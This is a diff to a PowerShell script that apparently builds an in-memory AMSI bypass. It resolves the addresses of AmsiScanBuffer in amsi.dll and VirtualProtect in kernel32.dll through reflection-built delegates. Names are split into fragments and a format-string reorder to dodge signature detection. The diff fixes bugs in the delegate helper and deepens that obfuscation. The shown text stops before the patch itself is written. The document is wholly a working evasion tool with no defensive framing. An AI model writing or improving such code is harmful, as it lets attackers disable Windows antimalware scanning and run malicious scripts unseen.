@@ -13,14 +13,18 @@ function GetAddress($m, $f) {
 }
 
 function GetType($f, $dT = [Void]) {
-    $t = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $t = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+    [System.MulticastDelegate])
 
-    $t.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
-    $t.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+    $t.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $f).SetImplementationFlags('Runtime, Managed')
+    $t.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $dT, $f).SetImplementationFlags('Runtime, Managed')
+
+    return $t.CreateType()
 }
 
 $a = "a" + "ms" + "i" + "." + "dll"
 $b =  $a.Substring(0, 1).ToUpper() + $a.Substring(1, 3) + "Sc" + "an" + "Bu" + "ff" + "er"
 $ab = GetAddress $a $b
 
-$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetAddress "ke" + "rnel" + "32.d" +" ll" ("Vir" + "tual" + "Pro" + "tect")), (GetType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))
+$vp = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f 'Pointer','nction','GetDelega','teFo','u','rF').Invoke((GetAddress ("kern" + "el3" + "2.dl" + "l") ("Vi" + "rtu" + "alPr" + "ote" + "ct")), (GetType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))
+
